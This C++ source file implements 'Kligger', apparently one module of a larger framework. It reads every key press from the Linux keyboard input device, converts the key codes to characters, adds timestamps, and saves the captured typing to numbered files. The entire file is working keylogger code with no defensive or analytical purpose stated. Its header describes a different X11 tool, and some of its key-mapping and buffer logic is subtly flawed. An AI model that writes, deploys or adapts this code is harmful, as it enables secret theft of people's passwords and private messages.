// xkbcat: Logs X11 keypresses, globally.


#include "kligger.h"


char Kligger::keyCodeToChar(int keyCode, bool isShiftPressed, bool isCapsLockOn) {
    // Basic mapping for lowercase letters and numbers
    static const std::map<int, char> keyMap = {
        {KEY_A, 'a'}, {KEY_B, 'b'}, {KEY_C, 'c'}, {KEY_D, 'd'}, {KEY_E, 'e'}, {KEY_F, 'f'}, {KEY_G, 'g'}, {KEY_H, 'h'}, {KEY_I, 'i'}, {KEY_J, 'j'}, {KEY_K, 'k'}, {KEY_L, 'l'}, {KEY_M, 'm'}, {KEY_N, 'n'}, {KEY_O, 'o'}, {KEY_P, 'p'}, {KEY_Q, 'q'}, {KEY_R, 'r'}, {KEY_S, 's'}, {KEY_T, 't'}, {KEY_U, 'u'}, {KEY_V, 'v'}, {KEY_W, 'w'}, {KEY_X, 'x'}, {KEY_Y, 'y'}, {KEY_Z, 'z'}, // Add more mappings as needed
        {KEY_1, '1'}, {KEY_2, '2'}, {KEY_3, '3'}, {KEY_4, '4'}, {KEY_5, '5'}, {KEY_6, '6'}, {KEY_7, '7'}, {KEY_8, '8'}, {KEY_9, '9'}, {KEY_0, '0'},// Numeric keys
        {KEY_MINUS, '-'}, {KEY_EQUAL, '='}, {KEY_GRAVE, '`'}, {KEY_LEFTBRACE, '['}, {KEY_RIGHTBRACE, ']'}, {KEY_SEMICOLON, ';'}, {KEY_APOSTROPHE, '\''}, {KEY_BACKSLASH, '\\'}, {KEY_COMMA, ','}, {KEY_DOT, '.'}, {KEY_SLASH, '/'},
        // Add mappings for other keys you're interested in
        {KEY_SPACE, ' '},
        {KEY_TAB, '\t'},
        {KEY_BACKSPACE, '\b'},
        {KEY_ESC, '\033'},
        {KEY_LEFT, KEY_LEFT},
        {KEY_RIGHT, KEY_RIGHT},
        {KEY_UP, KEY_UP},
        {KEY_DOWN, KEY_DOWN},
        {KEY_INSERT, KEY_INSERT},
        {KEY_DELETE, KEY_DELETE},
        {KEY_HOME, KEY_HOME},
        {KEY_END, KEY_END},
        {KEY_PAGEUP, KEY_PAGEUP},
        {KEY_PAGEDOWN, KEY_PAGEDOWN},
        {KEY_F1, KEY_F1},
        {KEY_F2, KEY_F2},
        {KEY_F3, KEY_F3},
        {KEY_F4, KEY_F4},
        {KEY_F5, KEY_F5},
        {KEY_F6, KEY_F6},
        {KEY_F7, KEY_F7},
        {KEY_F8, KEY_F8},
        {KEY_F9, KEY_F9},
        {KEY_F10, KEY_F10},
        {KEY_F11, KEY_F11},
        {KEY_F12, KEY_F12},
        {KEY_CAPSLOCK, KEY_CAPSLOCK},
        {KEY_NUMLOCK, KEY_NUMLOCK},
        {KEY_SCROLLLOCK, KEY_SCROLLLOCK},
        {KEY_LEFTSHIFT, KEY_LEFTSHIFT},
        {KEY_RIGHTSHIFT, KEY_RIGHTSHIFT},
        {KEY_LEFTCTRL, KEY_LEFTCTRL},
        {KEY_RIGHTCTRL, KEY_RIGHTCTRL},
        {KEY_LEFTALT, KEY_LEFTALT},
        {KEY_RIGHTALT, KEY_RIGHTALT},
        {KEY_LEFTMETA, KEY_LEFTMETA},
        {KEY_RIGHTMETA, KEY_RIGHTMETA},
        {KEY_MENU, KEY_MENU},
        {KEY_PRINT, KEY_PRINT},
        {KEY_PAUSE, KEY_PAUSE},
        {KEY_SYSRQ, KEY_SYSRQ},
        {KEY_POWER, KEY_POWER},
        {KEY_SLEEP, KEY_SLEEP},
        {KEY_WAKEUP, KEY_WAKEUP},

    };//add the rest
    static const std::map<int, char> keyMap_shift = {
        {KEY_1, '!'}, {KEY_2, '@'}, {KEY_3, '#'}, {KEY_4, '$'}, {KEY_5, '%'}, {KEY_6, '^'}, {KEY_7, '&'}, {KEY_8, '*'}, {KEY_9, '('}, {KEY_0, ')'},
        {KEY_MINUS, '_'}, {KEY_EQUAL, '+'}, {KEY_GRAVE, '~'}, {KEY_LEFTBRACE, '{'}, {KEY_RIGHTBRACE, '}'}, {KEY_SEMICOLON, ':'}, {KEY_APOSTROPHE, '"'}, {KEY_BACKSLASH, '|'}, {KEY_COMMA, '<'}, {KEY_DOT, '>'}, {KEY_SLASH, '?'}
    };
    // Check if the key is a letter and adjust for caps lock or shift
    bool isLetter = keyCode >= KEY_A && keyCode <= KEY_Z;
    if (isLetter && (isCapsLockOn ^ isShiftPressed)) {
        // Convert to uppercase if caps lock is on or shift is pressed (but not both)
        int offset = 'A' - 'a'; // Difference between ASCII values of uppercase and lowercase letters
        return keyMap.at(keyCode) + offset;
    }
    else if (isShiftPressed && keyMap_shift.find(keyCode) != keyMap_shift.end()){
        return keyMap_shift.at(keyCode);

    }
    auto it = keyMap.find(keyCode);
    if (it != keyMap.end()) {
        return it->second;
    }

    return '\0'; // Indicates no mapping found
}

int Kligger::keystrock(int argc, char * argv[]) {
    bool shiftPressed= false;
    bool capsLockActive = false;
    int fd;
    struct libevdev *dev = nullptr;
    int rc = 1;

    fd = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY|O_NONBLOCK); // Replace "eventX" with your device's event number
    if (fd < 0) {
        std::cerr << "Failed to open device, please check the device path and permissions." << std::endl;
        return 1;
    }

    rc = libevdev_new_from_fd(fd, &dev);
    if (rc < 0) {
        std::cerr << "Failed to init libevdev (" << strerror(-rc) << ")" << std::endl;
        return 1;
    }

    std::cout << "Input device name: \"" << libevdev_get_name(dev) << "\"" << std::endl;

    do {
        struct input_event ev;
        rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_NORMAL | LIBEVDEV_READ_FLAG_BLOCKING, &ev);
        if (rc == 0 && ev.type == EV_KEY && (ev.value == 0 || ev.value == 1)) {
            if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                shiftPressed = ev.value == 1; // 1 for key press, 0 for key release
            } else if (ev.code == KEY_CAPSLOCK && ev.value == 1) {
                capsLockActive = !capsLockActive; // Toggle state on press
            } else if (ev.value == 1) { // For other keys, consider only key press events
                // Now you can use shiftPressed and capsLockActive to adjust behavior
                keyadd(ev.code, ev.time.tv_sec, shiftPressed, capsLockActive);
            }
        }
    } while (rc == 1 || rc == 0 || rc == -EAGAIN);

    if (dev != nullptr) {
        libevdev_free(dev);
    }
    close(fd);

    return 0;
}
void Kligger::keyadd(int keyCode, time_t now, bool isShiftPressed, bool isCapsLockOn) {
    if ((FILE_SIZE-this->index_buffer)<=1){
            this->writeFile();
    }
    
    if (difftime(now, lastkeytime)>60){
        struct tm* timeinfo = localtime(&now);

        // Format time: e.g., "2023-04-12 14:55:02"
        const char* format = "%Y-%m-%d %H:%M:%S ";
    
        // Write formatted time to buffer
        int written = strftime(buffer+index_buffer, FILE_SIZE, format, timeinfo);
        if (written == 0) {
            this->writeFile();
            written = strftime(buffer, FILE_SIZE, format, timeinfo);
        }
        this->index_buffer+=written;
        this->lastkeytime=now;
    }
    // Convert time difference to string and append to buffer
    char letter= keyCodeToChar(keyCode, isShiftPressed, isCapsLockOn);
    std::memcpy(this->buffer + this->index_buffer, &letter, sizeof(char));
    this->index_buffer+=1;
}
void Kligger::run(const ContParams kilgParams){
    std::cout<<"run"<<std::endl;
    this->continue_to_run=1;
    this->keystrock(0,NULL);//check the var
}

int Kligger::halt() {
    this->continue_to_run=0;

    if (index_buffer>0){
        this->writeFile();
    }
    return 0;
};

Kligger::Kligger(){
    this->i=0;
    this->continue_to_run=0;
    this->index_buffer=0;
    this->lastkeytime=0;
}

Kligger::~Kligger(){
    i=0;
    this->halt();
}

int Kligger::writeFile() {
    std::string name = std::to_string(i) + ".kligger";
    int res = Contraption::writeFile(name, buffer, strlen(buffer), OverWrite);
    memset(buffer, 0, FILE_SIZE);
    index_buffer=0;
    lastkeytime=0;
    i++;
    return res;

}


